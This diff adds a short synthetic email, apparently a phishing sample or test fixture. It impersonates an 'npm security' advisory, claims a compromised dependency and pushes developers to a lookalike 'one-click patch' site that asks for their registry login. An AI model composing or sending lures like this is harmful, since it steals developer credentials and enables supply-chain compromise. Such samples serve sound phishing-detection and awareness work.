@@ -1,0 +1,11 @@
+From: =?utf-8?B?bnBtIHNlY3VyaXR5?= <advisory@npm-sec.example>
+To: dev@corp.internal
+Date: Thu, 03 Sep 2026 09:19:00 +0800
+Message-ID: <0009-b11@synth.example>
+Subject: [CRITICAL] dependency update required
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Your lockfile references a compromised package. Apply the fix immediately:
+https://npm-sec-fix.example.info/patch
+(One-click patch requires registry login.)
